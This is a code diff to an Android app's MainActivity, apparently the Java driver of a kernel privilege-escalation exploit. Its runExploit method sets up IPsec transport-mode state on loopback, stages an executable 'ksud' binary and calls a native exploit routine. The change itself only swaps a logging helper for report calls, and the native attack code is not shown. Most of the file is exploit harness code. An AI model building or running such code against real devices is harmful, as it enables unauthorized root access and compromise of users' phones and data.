@@ -90,18 +90,18 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
     private void runExploit() {
         try {
-            log("=== setup ===");
+            report("=== setup ===\n");
             IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);
 
             IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
             int encapPort = encapSock.getPort();
-            log("encap port: " + encapPort);
+            report("encap port: " + encapPort + "\n");
 
             InetAddress loopback = InetAddress.getByName("127.0.0.1");
             IpSecManager.SecurityParameterIndex spiObj =
                     ipsec.allocateSecurityParameterIndex(loopback);
             int spiVal = spiObj.getSpi();
-            log("spi: 0x" + Integer.toHexString(spiVal));
+            report("spi: 0x" + Integer.toHexString(spiVal) + "\n");
 
             SecureRandom rng = new SecureRandom();
             byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
@@ -121,10 +121,10 @@ public class MainActivity extends AppCompatActivity implements IReporter {
                     .buildTransportModeTransform(loopback, spiObj);
 
             stageAsset(this, "ksud", true, getFilesDir());
-            log("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath());
+            report("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath() + "\n");
 
-            log("");
-            log("=== exploit ===");
+            report("\n");
+            report("=== exploit ===\n");
             int icvLen = 128 / 8;
             String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
             int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, false);
@@ -140,7 +140,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
         } catch (Exception e) {
             Log.e(TAG, "exploit exception", e);
-            log("\nexception: " + e);
+            report("\nexception: " + e + "\n");
         } finally {
             mMain.post(() -> {
                 binding.btnRun.setEnabled(true);
@@ -161,8 +161,4 @@ public class MainActivity extends AppCompatActivity implements IReporter {
         if (executable) dest.setExecutable(true, false);
     }
 
-    private void log(String msg) {
-        Log.i(TAG, msg);
-        report(msg + "\n");
-    }
 }
